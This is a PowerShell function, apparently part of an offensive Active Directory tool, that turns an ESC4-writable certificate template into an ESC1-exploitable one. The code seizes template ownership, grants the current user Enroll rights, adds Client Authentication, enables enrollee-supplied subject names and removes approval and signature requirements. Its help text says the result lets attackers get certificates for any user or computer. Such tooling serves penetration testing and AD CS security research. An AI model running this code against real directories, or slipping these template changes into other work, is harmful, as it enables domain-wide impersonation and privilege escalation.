function ConvertTo-ESC1 {
    <#
        .SYNOPSIS
        Converts an ESC4 vulnerability to an ESC1 vulnerability by modifying certificate template attributes.

        .DESCRIPTION
        This function takes an ESC4 ESCalatorIssue object and attempts to convert it to an ESC1 vulnerability
        by making the following changes to the associated certificate template:
        1. Add the "Client Authentication" EKU (1.3.6.1.5.5.7.3.2) to pKIExtendedKeyUsage
        2. Enable the SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1) in msPKI-Certificate-Name-Flag
        3. Remove the Pend flag (CT_FLAG_PEND_ALL_REQUESTS = 0x2) from msPKI-Enrollment-Flag
        4. Set the msPKI-RA-Signature value to 0 (disable required signatures)
        5. Grant the current user Enroll rights on the template

        These changes make the template vulnerable to ESC1 attacks where attackers can specify
        arbitrary Subject Alternative Names and obtain certificates for any user/computer.
        
        Additionally, the function grants the current user Enroll rights on the template to
        ensure the attack can be executed successfully.

        .PARAMETER InputObject
        Either an ESCalatorIssue object representing an ESC4 vulnerability, or a DirectoryEntry object
        representing a certificate template (pKICertificateTemplate). When using ESCalatorIssue objects,
        they must have a DirectoryEntry property pointing to a certificate template object.

        .PARAMETER PassThru
        Returns the modified DirectoryEntry object representing the certificate template instead of 
        the default result object. Useful for chaining operations in a pipeline.

        .PARAMETER WhatIf
        Shows what changes would be made without actually performing them.

        .INPUTS
        ESCalatorIssue, System.DirectoryServices.DirectoryEntry
        ESC4 ESCalatorIssue objects with certificate template DirectoryEntry objects, or DirectoryEntry objects representing certificate templates.

        .OUTPUTS
        PSCustomObject, System.DirectoryServices.DirectoryEntry
        By default, returns a result object indicating success/failure and what changes were made.
        When -PassThru is specified, returns the modified DirectoryEntry object representing the certificate template.

        .EXAMPLE
        $ESC4Issues = Find-ESC4Issue -AdcsObjects $AdcsObjects
        $ESC4Issues | Where-Object { $_.Subtype -like '*Template*' } | ConvertTo-ESC1

        .EXAMPLE
        $ESC4Issue = Find-ESC4Issue -AdcsObjects $AdcsObjects | Select-Object -First 1
        ConvertTo-ESC1 -InputObject $ESC4Issue -WhatIf

        .EXAMPLE
        $Templates = Get-AdcsObjects | Where-Object { $_.ObjectClass -eq 'pKICertificateTemplate' }
        $DemoTemplate = $Templates | Where-Object { $_.Properties['name'].Value -eq 'Demo1' }
        ConvertTo-ESC1 -InputObject $DemoTemplate

        .EXAMPLE
        # Use PassThru to get the modified template object for further processing
        $ESC4Issue = Find-ESC4Issue -AdcsObjects $AdcsObjects | Select-Object -First 1
        $ModifiedTemplate = $ESC4Issue | ConvertTo-ESC1 -PassThru
        # Now you can use $ModifiedTemplate for additional operations

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2

        .NOTES
        WARNING: This function makes destructive changes to certificate templates that create
        serious security vulnerabilities. Only use in controlled test environments.
        
        Requires appropriate permissions to modify certificate template objects in Active Directory.
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        $InputObject,
        
        [Parameter()]
        [switch]$PassThru
    )

    #requires -Version 5

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Define constants for certificate template flags
        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
        $CT_FLAG_PEND_ALL_REQUESTS = 0x2
        
        # Client Authentication EKU OID
        $CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"
    }

    process {
        # Determine input type and extract template DirectoryEntry
        $template = $null
        $templateName = ""
        
        if ($InputObject.PSObject.TypeNames[0] -eq 'ESCalatorIssue') {
            # Handle ESCalatorIssue input
            Write-Verbose "Processing ESCalatorIssue for template: $($InputObject.Name)"
            
            # Validate that this is an ESC4 issue
            if ($InputObject.Technique -ne 'ESC4') {
                Write-Warning "Issue is not an ESC4 vulnerability (Technique: $($InputObject.Technique))"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Name
                    Error = "Not an ESC4 issue"
                    Changes = @()
                }
            }
            
            # Validate that we have a DirectoryEntry for the template
            if (-not $InputObject.DirectoryEntry -or $InputObject.DirectoryEntry.SchemaClassName -ne 'pKICertificateTemplate') {
                Write-Warning "ESCalatorIssue does not contain a valid certificate template DirectoryEntry"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Name
                    Error = "No valid certificate template DirectoryEntry found"
                    Changes = @()
                }
            }
            
            $template = $InputObject.DirectoryEntry
            $templateName = $InputObject.Name
            
        } elseif ($InputObject -is [System.DirectoryServices.DirectoryEntry]) {
            # Handle DirectoryEntry input
            Write-Verbose "Processing DirectoryEntry object for template conversion"
            
            # Validate that this is a certificate template
            if ($InputObject.SchemaClassName -ne 'pKICertificateTemplate') {
                Write-Warning "DirectoryEntry is not a certificate template (SchemaClassName: $($InputObject.SchemaClassName))"
                return [PSCustomObject]@{
                    Success = $false
                    Template = $InputObject.Properties['name'].Value
                    Error = "Not a certificate template DirectoryEntry"
                    Changes = @()
                }
            }
            
            $template = $InputObject
            $templateName = $template.Properties['name'].Value
            Write-Verbose "Processing certificate template: $templateName"
            
        } else {
            # Invalid input type
            Write-Warning "InputObject must be either an ESCalatorIssue or a DirectoryEntry object"
            return [PSCustomObject]@{
                Success = $false
                Template = "Unknown"
                Error = "Invalid input object type: $($InputObject.GetType().Name)"
                Changes = @()
            }
        }
        
        $changes = @()
        
        try {
            # Refresh the DirectoryEntry to get current values
            $template.RefreshCache()
            
            Write-Verbose "Current template attributes:"
            Write-Verbose "  pKIExtendedKeyUsage: $($template.Properties['pKIExtendedKeyUsage'].Value -join ', ')"
            Write-Verbose "  msPKI-Certificate-Name-Flag: $($template.Properties['msPKI-Certificate-Name-Flag'].Value)"
            Write-Verbose "  msPKI-Enrollment-Flag: $($template.Properties['msPKI-Enrollment-Flag'].Value)"
            Write-Verbose "  msPKI-RA-Signature: $($template.Properties['msPKI-RA-Signature'].Value)"
            
            # FIRST PRIORITY: Make current user owner of template, then grant Enroll rights - if either fails, end the function
            try {
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $currentUserSid = $currentUser.User.Value
                $currentUserSidObject = $currentUser.User
                $templateSecurity = $template.ObjectSecurity
                
                # Check current owner and change if necessary
                $currentOwner = $templateSecurity.Owner
                Write-Verbose "Current template owner: $currentOwner"
                
                if ($currentOwner -ne $currentUserSid) {
                    if ($PSCmdlet.ShouldProcess($template.Name, "Change template owner to current user ($($currentUser.Name))")) {
                        $originalOwner = $currentOwner
                        
                        # Set owner through ObjectSecurity property
                        $templateSecurity.SetOwner($currentUserSidObject)
                        $template.ObjectSecurity = $templateSecurity
                        $template.CommitChanges()
                        
                        $changes += "Changed template owner from $originalOwner to current user ($($currentUser.Name))"
                        Write-Verbose "Successfully changed template owner to current user"
                        
                        # Refresh security object after ownership change
                        $template.RefreshCache()
                        $templateSecurity = $template.ObjectSecurity
                    }
                } else {
                    Write-Verbose "Current user is already the owner of the template"
                }
                
                # Check if user already has Enroll rights
                $enrollGuid = [System.Guid]::new('0e10c968-78fb-11d2-90d4-00c04f79dc55')
                $hasEnrollRights = $templateSecurity.Access | Where-Object {
                    $_.IdentityReference.Value -eq $currentUserSid -and 
                    $_.ObjectType -eq $enrollGuid -and 
                    $_.AccessControlType -eq 'Allow'
                }
                
                if (-not $hasEnrollRights) {
                    if ($PSCmdlet.ShouldProcess($template.Name, "Grant current user ($currentUserSid) Enroll rights")) {
                        $enrollRule = [System.DirectoryServices.ActiveDirectoryAccessRule]::new(
                            $currentUser.User,
                            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                            [System.Security.AccessControl.AccessControlType]::Allow,
                            $enrollGuid
                        )
                        
                        $templateSecurity.AddAccessRule($enrollRule)
                        $template.ObjectSecurity = $templateSecurity
                        $template.CommitChanges()
                        
                        $changes += "Granted current user ($($currentUser.Name)) Enroll rights on template"
                        Write-Verbose "Successfully granted current user Enroll rights on template"
                    }
                } else {
                    Write-Verbose "Current user already has Enroll rights on template"
                }
                
            } catch {
                $errorMsg = "CRITICAL: Failed to grant Enroll rights to current user: $($_.Exception.Message)"
                Write-Error $errorMsg
                
                return [PSCustomObject]@{
                    Success = $false
                    Template = $templateName
                    Error = $errorMsg
                    Changes = $changes
                }
            }
            
            # 1. Add Client Authentication EKU to pKIExtendedKeyUsage
            $currentEKUs = @($template.Properties['pKIExtendedKeyUsage'].Value)
            if ($CLIENT_AUTH_EKU -notin $currentEKUs) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Add Client Authentication EKU to pKIExtendedKeyUsage")) {
                    $newEKUs = $currentEKUs + $CLIENT_AUTH_EKU
                    $template.Properties['pKIExtendedKeyUsage'].Clear()
                    foreach ($eku in $newEKUs) {
                        $template.Properties['pKIExtendedKeyUsage'].Add($eku)
                    }
                    $changes += "Added Client Authentication EKU ($CLIENT_AUTH_EKU)"
                    
                    Write-Verbose "Added Client Authentication EKU to template"
                }
            } else {
                Write-Verbose "Client Authentication EKU already present"
            }
            
            # 2. Enable SAN flag in msPKI-Certificate-Name-Flag
            $currentNameFlag = [int]$template.Properties['msPKI-Certificate-Name-Flag'].Value
            $newNameFlag = $currentNameFlag -bor $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
            
            if ($newNameFlag -ne $currentNameFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Enable SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) in msPKI-Certificate-Name-Flag")) {
                    $template.Properties['msPKI-Certificate-Name-Flag'].Value = $newNameFlag
                    $changes += "Enabled SAN flag in msPKI-Certificate-Name-Flag (0x$($currentNameFlag.ToString('X')) -> 0x$($newNameFlag.ToString('X')))"
                    
                    Write-Verbose "Enabled SAN flag in msPKI-Certificate-Name-Flag"
                }
            } else {
                Write-Verbose "SAN flag already enabled in msPKI-Certificate-Name-Flag"
            }
            
            # 3. Remove Pend flag from msPKI-Enrollment-Flag
            $currentEnrollFlag = [int]$template.Properties['msPKI-Enrollment-Flag'].Value
            $newEnrollFlag = $currentEnrollFlag -band (-bnot $CT_FLAG_PEND_ALL_REQUESTS)
            
            if ($newEnrollFlag -ne $currentEnrollFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Remove Pend flag (CT_FLAG_PEND_ALL_REQUESTS) from msPKI-Enrollment-Flag")) {
                    $template.Properties['msPKI-Enrollment-Flag'].Value = $newEnrollFlag
                    $changes += "Removed Pend flag from msPKI-Enrollment-Flag (0x$($currentEnrollFlag.ToString('X')) -> 0x$($newEnrollFlag.ToString('X')))"
                    
                    Write-Verbose "Removed Pend flag from msPKI-Enrollment-Flag"
                }
            } else {
                Write-Verbose "Pend flag not set in msPKI-Enrollment-Flag"
            }
            
            # 4. Set msPKI-RA-Signature to 0
            $currentRASignature = [int]$template.Properties['msPKI-RA-Signature'].Value
            if ($currentRASignature -ne 0) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Set msPKI-RA-Signature to 0 (disable required signatures)")) {
                    $template.Properties['msPKI-RA-Signature'].Value = 0
                    $changes += "Set msPKI-RA-Signature to 0 (was $currentRASignature)"
                    
                    Write-Verbose "Set msPKI-RA-Signature to 0"
                }
            } else {
                Write-Verbose "msPKI-RA-Signature already set to 0"
            }
            
            # Commit remaining changes to Active Directory
            if ($changes.Count -gt 1 -and -not $WhatIfPreference) {  # > 1 because Enroll rights were already committed
                Write-Verbose "Committing remaining changes to Active Directory..."
                $template.CommitChanges()
                Write-Verbose "Successfully committed remaining changes to template: $($template.Name)"
            }
            
            # Return result
            if ($PassThru) {
                # Refresh the DirectoryEntry to get updated properties
                $template.RefreshCache()
                return $template
            } else {
                return [PSCustomObject]@{
                    Success = $true
                    Template = $templateName
                    DistinguishedName = $template.Properties['distinguishedName'].Value
                    Changes = $changes
                    Error = $null
                }
            }
            
        } catch {
            $errorMsg = "Failed to modify template $($template.Name): $($_.Exception.Message)"
            Write-Warning $errorMsg
            
            # Note: For error cases, we always return the error object regardless of PassThru
            # since we cannot return a valid DirectoryEntry when the operation fails
            return [PSCustomObject]@{
                Success = $false
                Template = $templateName
                Error = $errorMsg
                Changes = $changes
            }
        }
    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
